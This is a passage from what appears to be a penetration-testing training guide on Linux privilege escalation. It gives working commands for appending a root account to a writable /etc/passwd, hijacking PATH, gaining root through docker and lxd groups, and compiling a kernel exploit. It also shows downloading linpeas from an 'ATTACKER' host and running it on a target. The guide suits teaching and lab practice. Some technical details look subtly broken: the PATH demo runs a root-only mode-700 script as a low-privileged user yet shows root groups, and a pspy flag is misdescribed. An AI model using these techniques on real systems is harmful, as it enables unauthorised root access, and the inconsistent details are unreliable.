other* all have read, write and execute. Owned by root, executed by root as a cron job —
so **anyone may replace the code root will run within a minute.** That is the whole
vulnerability. `ls -l` is the entire proof; you do not need to read the script.

**Why `pspy` and not `ps`.** `ps aux` shows the processes that exist *at the instant you
run it*. A job that runs for 200 ms every 5 seconds is almost never running when you look,
so `ps` shows nothing and you conclude there is no cron job. **pspy monitors the kernel
(`inotify` on `/proc`, plus `ptrace`-free polling) and reports processes as they start**,
including other users' — without needing root. `-p` disables its own command-line
printing; `-f` follows.

Reading pspy's lines: `2024-05-11 14:02:11 CMD: UID=0 PID=2841 | /bin/sh -c
/opt/md5check.py` — the **UID is the column that matters**: `UID=0` means root started it.
Two lines per invocation because cron runs `/bin/sh -c <job>`, and that shell then runs
the interpreter. Timestamps 5 seconds apart tell you the frequency — `* * * * *` in
crontab means once a minute, so a 5-second gap means it is actually in a tighter loop or
an `anacron`/`systemd.timer`. Either way: **root runs it, often, and you can rewrite it.**

The exploit is then trivial and worth understanding as a *pattern*: copy the original
aside, overwrite the script with a reverse shell or `chmod u+s /bin/bash`, wait one cycle,
and collect. Then restore the original — leaving a broken "integrity check" script behind
is the kind of thing that turns a lab exercise into a damaged system.

---

### 12.6 Writable files, and the `/etc/passwd` technique

```bash
find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' -not -path '/run/*' 2>/dev/null | head -50
find /etc -writable -type f 2>/dev/null
find / -perm -o+w -type f 2>/dev/null | head
ls -l /etc/passwd /etc/shadow /etc/sudoers /etc/ld.so.preload
```

```text
/etc/passwd
/etc/cron.d/backup
/opt/md5check.py
```
```text
-rw-rw-rw- 1 root root 1934 Dec  7  2017 /etc/passwd
-rw-r----- 1 root shadow 1204 Dec  7  2017 /etc/shadow
-r--r----- 1 root root  722 Dec  7  2017 /etc/sudoers
```

**`find` arguments**

| Token | Meaning |
| --- | --- |
| `-writable` | files **you** can write to, taking your UID, groups and ACLs into account. Much more useful than a raw mode test |
| `-perm -o+w` | files whose **other** write bit is set — i.e. world-writable, regardless of who you are |
| `-not -path '/proc/*'` | exclude the virtual filesystems, which are full of noise and permission errors |
| `\| head -50` | the first 50 results, so a huge output does not scroll past you |

**Reading `ls -l` on the four critical files.** Correct permissions are
`/etc/passwd` = `-rw-r--r--` (**644**), `/etc/shadow` = `-rw-r-----` (**640**, owned
`root:shadow`), `/etc/sudoers` = `-r--r-----` (**440**). Here `/etc/passwd` is
**`-rw-rw-rw-` (666)** — world-writable, and that single character in the "other" write
position is Machine 1's entire privilege escalation.

**`/etc/passwd` field layout** (seven colon-separated fields):

```text
michael:x:1000:1000:Michael Scott,,,:/home/michael:/bin/bash
   1    2  3    4         5               6            7
```

1 name · 2 password field (`x` = "look in `/etc/shadow`") · 3 **UID** · 4 **GID** ·
5 comment/GECOS · 6 home directory · 7 login shell.

**The technique:** replace the `x` in field 2 with a real hash. The authentication code
sees a hash there, verifies against it, and never consults `/etc/shadow`.

```bash
openssl passwd -1 -salt ignite superpassword
echo 'ignite:$1$ignite$XpO6y1nK1vB0yG0yQ3m0o0:0:0:root:/root:/bin/bash' | sudo tee -a /etc/passwd
su ignite
id
```

```text
$1$ignite$XpO6y1nK1vB0yG0yQ3m0o0
uid=0(root) gid=0(root) groups=0(root)
```

**Fields 3 and 4 must both be `0`** — that is what makes the account root. Anything else
gives you a normal user with a password you chose. **Single-quote the line**: `$1$ignite$…`
unquoted becomes shell variable expansion and silently truncates to `ignite::0:0:…`, which
then behaves as a passwordless account or fails outright, and you will spend twenty
minutes debugging a shell quoting problem while believing it is a Linux problem.

**Prefer this to editing `/etc/shadow`** when both are writable: appending a line is
additive, so you can delete your line afterwards and leave the system as you found it.
Editing `/etc/shadow` in place risks locking out a real account or corrupting the file,
and a corrupt shadow file can make the box unbootable — on a lab that costs you a
re-import, on a client that costs you an incident.

**Other files worth checking, in order of value:**

| File | If writable |
| --- | --- |
| `/etc/shadow` | replace a hash with one you know, or empty the field for a passwordless login |
| `/etc/sudoers` (or anything in `/etc/sudoers.d/`) | add `user ALL=(ALL) NOPASSWD: ALL` |
| `/etc/ld.so.preload` | name a shared library; it is loaded into **every** dynamically-linked process, including root's — instant root, and very destructive if you get it wrong |
| `/etc/crontab`, `/etc/cron.d/*` | arbitrary root-executed code |
| `/root/.ssh/authorized_keys` | SSH in as root |
| `/etc/ssh/sshd_config` | enable `PermitRootLogin`, or add your key path |
| any script a service runs as root | rewrite it |
| a directory listed in `/etc/ld.so.conf.d/*.conf` | plant a library, `ldconfig`, hijack a root binary |

---

### 12.7 PATH hijacking — demonstrated end to end

```bash
# On the target, as root, to CREATE the vulnerable condition (for practice):
printf '#!/bin/bash\ntar -czf /backups/www.tar.gz /var/www\n' > /opt/backup.sh
chmod 700 /opt/backup.sh
echo '* * * * * root /opt/backup.sh' > /etc/cron.d/backup

# As the low-privileged user, to EXPLOIT it:
echo $PATH
mkdir -p /tmp/x
printf '#!/bin/bash\n/bin/bash -p\n' > /tmp/x/tar
chmod +x /tmp/x/tar
export PATH=/tmp/x:$PATH
ls -l /tmp/x/tar
which tar
/opt/backup.sh
id
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

```text
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
-rwxr-xr-x 1 www-data www-data 30 May 11 14:20 /tmp/x/tar
/tmp/x/tar
uid=0(root) gid=0(root) euid=33(www-data) groups=0(root)
```

| Token | Meaning |
| --- | --- |
| `echo $PATH` | print the colon-separated search list. **Check for `.` or an empty field** — an empty entry means "the current directory", which is a hijack opportunity on its own |
| `export PATH=/tmp/x:$PATH` | **prepend** your directory. Order matters: the shell searches left to right and runs the **first** match |
| `which tar` | show which file the shell *would* run. **Run this before the exploit to confirm your binary wins** — it is the difference between a working hijack and an hour of confusion |
| `chmod +x` | a non-executable file in `PATH` is skipped silently, and the real `/bin/tar` runs instead |
| restoring `PATH` at the end | your session is now broken for ordinary commands: `/tmp/x` has no `ls`, `cat` or `id`. Restore it, or open a new session |

**Why it works.** `PATH` is a *convenience*, not a security mechanism. When a program
invokes `tar` by bare name, the resolution is done by whatever shell or `execvp()` call
performs it, using **that process's** environment. A privileged process that inherits or
consults a user-influenced `PATH` will run the user's file with its own privileges.

**The three conditions required:** something privileged runs, it calls a command **by
bare name** (not `/usr/bin/tar`), and you can control either its `PATH` or place a file in
a directory already earlier in its `PATH`.

**The `euid=33` in that `id` output is a teaching moment.** `bash -p` preserved the SUID
privileges of the *calling* context but here the caller was a root cron job spawning a
shell — so you have `gid=0`/`groups=0(root)` (root group membership, which is enough to
read almost anything) while `euid` stayed 33. Read `id` carefully rather than assuming:
group membership alone frequently suffices, and misreading it makes people abandon a
working escalation.

**Defences, so you know what to look for in `sudo -l`:** `Defaults secure_path=…` in
sudoers (present on Machines 1–4, absent on 12), absolute paths in every script and
privileged program, `execve()` with a fixed `argv` and an explicit environment, and never
having a user-writable directory in a privileged `PATH`.

---

### 12.8 Groups as escalation vectors

```bash
id
groups
getent group docker
```

```text
uid=1000(hummingbirdscyber) gid=1000(hummingbirdscyber) groups=1000(hummingbirdscyber),108(lxd),999(docker)
```

`getent group docker` prints the group's entry from whatever source `/etc/nsswitch.conf`
names (usually `/etc/group`): `docker:x:999:hummingbirdscyber` — name, password field,
GID, members. The trailing member list is how you find *everyone* who is effectively root.

| Group | Escalation |
| --- | --- |
| **`docker`** | `docker run -v /:/host --rm -it alpine chroot /host` — mount the host's root into a container you control, then `chroot` into it |
| **`lxd`** | `lxc init ubuntu s -c security.privileged=true` · `lxc config device add s x disk source=/ path=/mnt` · `lxc start s` · `lxc exec s -- /bin/sh` → `/mnt` is the host's `/` |
| **`sudo`/`wheel`** | `sudo -l`, then §12.2 |
| **`adm`** | read `/var/log/*` → harvest credentials, tokens, and log-poisoning targets |
| **`disk`** | `debugfs /dev/sda1` → raw block-device access; read and write anything |
| **`shadow`** | read `/etc/shadow` → offline cracking |
| **`video`** | read the framebuffer → capture the screen |
| **`www-data`** | read web configs and DB credentials |

**The docker one-liner, decoded:**

```bash
docker run -v /:/host --rm -it alpine chroot /host
```

| Token | Meaning |
| --- | --- |
| `docker run` | create and start a new container |
| `-v /:/host` | **bind-mount the host's `/` at `/host` inside the container.** This is the entire attack |
| `--rm` | delete the container when it exits — leaves less evidence |
| `-it` | interactive with a TTY |
| `alpine` | the image; a few MB, usually cached. Substitute `ubuntu` if alpine is unavailable |
| `chroot /host` | make `/host` the new filesystem root, then run the default shell |

The Docker **daemon runs as root**. Membership of the `docker` group means you may ask
that daemon to do anything — including handing you a root-owned view of the host
filesystem. **There is no CVE, no exploit and no software bug here**; the only defect is
the group membership. That is why "who is in the docker group?" is a standing audit
question, and why rootless Docker or Podman is the real fix.

---

### 12.9 Automation — `linpeas`, and how to read it

```bash
# ATTACKER
python3 -m http.server 8000
# TARGET
wget http://ATTACKER:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh -a 2>/dev/null | tee /tmp/peas.txt
```

```text
                      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
               ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
        ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
  ╔══════════════════════════════════════════════════╗
  ║   Linux Privilege Escalation Awesome Scripts     ║
  ╚══════════════════════════════════════════════════╝

[+] Basic information
lsb_release -a 2>/dev/null: No LSB modules are available.
OS: Ubuntu 16.04.7 LTS
Kernel: 4.4.0-210-generic
Current user: www-data

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.8.16
[+] Possibly CVE-2019-14287 (sudo < 1.8.28) — check manually

╔══════════╣ Searching SUID/SGID files
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-us
  /usr/bin/tail
  /usr/bin/php7.2      <-- 96% PE

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
/home/cyber/tar = cap_dac_read_search+ep  <-- 98% PE

╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs
/etc/crontab: * * * * * root /opt/md5check.py   <-- 99% PE (writable!)
```

| Token | Meaning |
| --- | --- |
| `-a` | run **all** checks, including the slow ones (password brute force against `su`, thorough searches) |
| `-s` | "superfast" — skip the slow checks |
| `-q` | quiet: suppress the section banners |
| `2>/dev/null` | discard permission-denied noise |
| `\| tee /tmp/peas.txt` | show it **and** save it — you will want to grep it later |
| `-o FILE` | write a report file directly |
| `FAST=1 ./linpeas.sh` | environment-variable form of fast mode |

**Reading it.** linpeas colour-codes by probability: **red/yellow = 95%+ likely to be
exploitable**, green = interesting, blue = informational. In a terminal the colours are
the interface; piped into `tee` you lose them, so look for the `<-- 9X% PE` markers it
prints instead. Each finding links to a HackTricks page explaining the technique — follow
those, because the tool tells you *what*, not *why*.

**Use it to shortcut the search, not to replace it.** Three reasons to run the manual
checklist first at least once per machine: linpeas misses things outside its rule set (a
custom application that reads your file, a service with a writable config, an
`authorized_keys` in an unexpected place); the colour output trains you to skim rather
than reason; and in a real report you must be able to explain *why* a finding is
exploitable, which the tool will not do for you.

---

### 12.10 Kernel exploits — the last resort

```bash
uname -r
searchsploit linux kernel 3.13
searchsploit -m 37292
less 37292.c
gcc 37292.c -o ofs
./ofs
id
```

```text
3.13.0-32-generic
---------------------------------------------------------------------------
 Exploit Title                                    |  Path
---------------------------------------------------------------------------
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04)   | linux/local/37292.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04)           | linux/local/44298.c
---------------------------------------------------------------------------
```
```text
spawned root shell:
# id
uid=0(root) gid=0(root) groups=0(root),1000(itsskv)
```

**Why this is the last resort, in order of importance:**

1. **It can crash the VM.** A failed overflow frequently panics the kernel. You lose your
   shell, your unsaved work and, on a box you did not snapshot, your progress.
2. **It is version- and architecture-specific.** `3.13.0-32` is not `3.13.0-35`; a 32-bit
   target needs a 32-bit payload. `searchsploit` matches on *strings*, so it will happily
   suggest an exploit for a different kernel in the same series.
3. **It usually needs compilation**, with all the friction that implies — missing headers,
   a target without `gcc`, a 20-year-old source that does not build against a modern
   toolchain.
4. **On a beginner box there is almost always a configuration error in front of you.**
   `sudo -l`, `getcap`, SUID, cron and writable files are faster, quieter and more
   instructive.

**Trust linpeas's CVE list over `searchsploit`.** linpeas compares your actual kernel
version against a maintained CVE database; `searchsploit` does substring matching on
titles. When they disagree, believe the version comparison.

**Prefer precompiled binaries when they exist** (EDB often ships them), and **read the
source either way** — you need to know which arguments it takes, whether it writes
anything persistent, and whether it will restore the system afterwards.
`spawned root shell:` in the output above is the exploit telling you it succeeded; some
instead silently drop you into a shell, which is why you run `id` immediately rather than
assuming.

---

_Back to [Learning Path 1](README.md) · previous: [04 — Credentials and Cracking](04-Credentials-and-Cracking.md) · next: [06 — Shells, Persistence and Escapes](06-Shells-Persistence-and-Escapes.md)._
